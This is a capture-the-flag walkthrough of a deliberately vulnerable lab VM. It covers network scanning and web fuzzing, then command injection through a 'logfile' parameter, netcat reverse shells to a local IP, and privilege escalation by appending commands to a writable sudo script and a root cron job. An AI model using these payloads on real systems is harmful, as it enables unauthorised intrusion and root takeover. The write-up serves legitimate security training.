Walkthrough for Mr.Robot virtual machine

Starting the attack I had to identify the virtual machine IP addr. I did this by running rubicon which is a script I programmed. The nmap scrip that it runs is "nmap -sn 192.168.0.0/24". This scans the range of IP's in that range to list all IP's on my network. To recreate this on your own network run ifconfig and if it returns 192.168.1.XXX then use 192.168.1.0/24 as your range or adapt for your IP addr. As you can see the NMAP scan returned the information below and I determined that
the target IP addr is 192.168.56.105

Script: 
```
nmap -sN 192.168.56.0/24
```

![[Screenshot From 2025-06-24 11-29-52.png]]

After identifying the IP addr, I noticed port 8080 is open on the device. I then opened my browser and went to the address.

I was greeted with a login prompt. I left it the defualt username and hit enter,

Upon hitting enter I was greeted with a chat room. i then typed test and hit enter. The chat appeared in the chat window.

Address
```
192.168.56.105:8080
```

![[Screenshot From 2025-06-24 11-35-31.png]]

![[Screenshot From 2025-06-24 11-35-44.png]]

I inspected the page source and found nothing suspicious so I decided to ffuf scan the web address.

Script:
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .html,.php,.txt -u http://192.168.56.105:8080/FUZZ -of html -o dir.html -fs 2899
```

The scan revealed three pages to follow:
- administration.php
- chat.txt
- process.php

![[Screenshot From 2025-06-24 11-38-25.png]]

I entered chat.txt and noticed it was just a log of all the chats as a plain text file

![[Screenshot From 2025-06-24 11-39-24.png]]

I then decided to go to administration.php and was greeted with a message stating access is denied and the actions had been logged.

![[Screenshot From 2025-06-24 11-40-20.png]]

The "view :" seemed suspicious to me as it seemed like it was expecting something, maybe a file or something similar to state what the user is/isn't allowed to view. going back to the chat screen showed something was supposed to be posted, but it was empty.

![[Screenshot From 2025-06-24 11-44-10.png]]

This seemed weird so I decided to run another ffuf scan on the administration.php address and it showed a file named "logfile".

Script:
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.56.105:8080/administration.php?FUZZ=anything' -of html -o admin-get.html -fs 65
```

![[Screenshot From 2025-06-24 11-42-14.png]]

I decided to test for Local File Inclusion (LFI) by running ?logfile=chat.txt. that revealed a plain text view of the chat.txt file. 

![[Screenshot From 2025-06-24 11-45-08.png]]

This allows us to use this chat file to display information about the system via a ";". I decided to try and view which user we were under on the website.

Address/Script:
```
?logfile=chat.txt;whoami
```

This revealed the user we are under within the webpage and confirms we can execute commands.

![[Screenshot From 2025-06-24 11-50-51.png]]

![[Screenshot From 2025-06-24 11-51-43.png]]

I decided to try and get a reverse shell on the machine using netcat (nc). Before we can execute nc we have to rememeber that we are "the machine", not technically a user on the device, so running all non-native commands, we have to find then out first. If we are going to use nc, we have to find out which nc to use.

Address/Script:
```
?logfile=chat.txt;which nc
```

![[Screenshot From 2025-06-24 11-54-27.png]]

This reveled nc was located at /usr/bin/nc meaning we can run it. I opened a listener on my local machine and invoked a remote connection on the website. and IT WORKED!!

Local Machine Script:
```
nc -lvnp 9000
```

Address/Script:
```
?logfile=;nc -e /bin/bash 192.168.56.1 9000
```

![[Screenshot From 2025-06-24 12-06-00.png]]

![[Screenshot From 2025-06-24 12-06-13.png]]

Now we have to verify who we are by running whoami in the remote shell.

Script:
```
whoami
```

That showed that we are infact www-data. Lets run a "sudo -l" to see what kind of sudo access we have.

Script:
```
sudo -l
```

This revealed that we can run a single file as another user named julia as sudo.

![[Screenshot From 2025-06-24 12-08-11.png]]

Lets see what kind of access is on that file, who can do what and who owns it. I did this by running "ls -alps"

Script:
```
ls -alps
```

This revealed that other users other than root can write to it, so I added a binary bash at the end of the file which will execute when we run it. This will give us access to a shell under the user we execute the start.sh file as.

![[Screenshot From 2025-06-24 12-11-00.png]]

![[Screenshot From 2025-06-24 12-11-51.png]]

I then executed the file as julia.

Script:
```
sudo -u julia bash /var/www/html/start.sh
```

And we were now able to execute commands as julia.

![[Screenshot From 2025-06-24 12-12-49.png]]

Now we have broke out of the www-data account we need to grab the user flag. lets get to the users home directory via a simple "cd" and see if the flag is there.

Script:
```
cd
ls -alps
```

![[Screenshot From 2025-06-24 12-15-13.png]]

We see a file called user.txt, catting it out gave us our first flag.

Script:
```
cat user.txt
```

![[Screenshot From 2025-06-24 12-15-59.png]]

Now we need to work on the root flag. Understanding the linux system and having done many machines, I always check the cron jobs first to see if there is any privlage escalation possible. This is always a good place to start as all cronjobs run as root on normal system. Lets dig into it.

Script:
```
cat /etc/crontab
```

![[Screenshot From 2025-06-24 12-18-49.png]]

this revealed a custom crontab added that ran a file called check.sh. Lets see the contents of that file. That revealed it was just running a loop every so often to ensure a service was running.

Script:
```
cat /var/cron/check.sh
```

![[Screenshot From 2025-06-24 12-20-24.png]]

I decided to try and get it to invoke a reverse shell. I opened a listener on another terminal tab and added a reverse shell one-liner to the end of the file.

New Terminal Tab Script:
```
nc -lvnp 9001
```

Current Reverse Shell Script:
```
echo 'nc -e /bin/bash 192.168.56.1 9001' >> /var/cron/check.sh
```

![[Screenshot From 2025-06-24 12-24-19.png]]

After waiting a bit we received the connection. running a whoami verified we are root. Lets get this last flag.

![[Screenshot From 2025-06-24 12-25-23.png]]

Obtaining the last flag was easy by running a cd and catting out the root.txt file

Script:
```
cd
ls -al
cat root.txt
```

![[Screenshot From 2025-06-24 12-26-26.png]]

With that, we've completed the machine. Thank you for reading. If you need clarification on anything, please feel free to ask OR go to my YouTube channel to watch the live walk-through.